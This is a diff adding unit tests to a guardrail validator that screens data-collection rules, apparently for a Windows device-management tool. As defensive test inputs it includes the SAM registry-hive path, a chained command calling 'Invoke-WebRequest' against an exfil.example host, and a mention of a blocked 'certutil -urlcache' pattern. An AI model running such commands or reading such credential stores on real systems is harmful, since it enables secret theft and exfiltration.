@@ -113,6 +113,65 @@ describe('gather guardrails (agent matching semantics)', () => {
     expect(errors(validateRuleDraft(bad).findings).some((m) => m.includes('hard-blocked'))).toBe(true);
   });
 
+  it('rejects the registry-hive store path (System32\\config) as hard-blocked', () => {
+    const bad = validGather();
+    bad.collectorType = 'file';
+    bad.target = 'C:\\Windows\\System32\\config\\SAM';
+    expect(errors(validateRuleDraft(bad).findings).some((m) => m.includes('hard-blocked'))).toBe(true);
+  });
+
+  it('validates json/xml targets with file-path semantics', () => {
+    const okJson = validGather();
+    okJson.collectorType = 'json';
+    okJson.target = 'C:\\ProgramData\\Microsoft\\IntuneManagementExtension\\Logs\\state.json';
+    expect(validateRuleDraft(okJson).valid).toBe(true);
+
+    const blockedJson = validGather();
+    blockedJson.collectorType = 'json';
+    blockedJson.target = 'C:\\Users\\admin\\AppData\\Local\\app\\state.json';
+    expect(errors(validateRuleDraft(blockedJson).findings).some((m) => m.includes('hard-blocked'))).toBe(true);
+
+    const badXml = validGather();
+    badXml.collectorType = 'xml';
+    badXml.target = 'D:\\NotAllowed\\config.xml';
+    expect(errors(validateRuleDraft(badXml).findings).some((m) => m.includes('allowed file prefix'))).toBe(true);
+  });
+
+  it('rejects hard-blocked command patterns and over-length commands', () => {
+    const blocked = validGather();
+    blocked.collectorType = 'command_allowlisted';
+    blocked.target = 'Get-Tpm; Invoke-WebRequest -Uri https://exfil.example';
+    expect(errors(validateRuleDraft(blocked).findings).some((m) => m.includes('hard-blocked pattern'))).toBe(true);
+
+    const long = validGather();
+    long.collectorType = 'command_allowlisted';
+    long.target = 'Get-Something ' + 'a'.repeat(2100);
+    expect(errors(validateRuleDraft(long).findings).some((m) => m.includes('character hard limit'))).toBe(true);
+  });
+
+  it('still accepts allowlisted commands that contain no blocked pattern', () => {
+    const ok = validGather();
+    ok.collectorType = 'command_allowlisted';
+    // must not be caught by the "certutil -urlcache" pattern
+    ok.target = 'certutil -store My';
+    expect(validateRuleDraft(ok).valid).toBe(true);
+  });
+
+  it('rejects activePhases + activeFromPhase set together (backend 400 parity)', () => {
+    const bad = validGather();
+    bad.activePhases = ['DeviceSetup'];
+    bad.activeFromPhase = 'AccountSetup';
+    expect(errors(validateRuleDraft(bad).findings).some((m) => m.includes('mutually exclusive'))).toBe(true);
+
+    const okPhases = validGather();
+    okPhases.activePhases = ['DeviceSetup'];
+    expect(validateRuleDraft(okPhases).valid).toBe(true);
+
+    const okFrom = validGather();
+    okFrom.activeFromPhase = 'AccountSetup';
+    expect(validateRuleDraft(okFrom).valid).toBe(true);
+  });
+
   it('accepts an allow-listed file target and rejects others', () => {
     const ok = validGather();
     ok.collectorType = 'file';
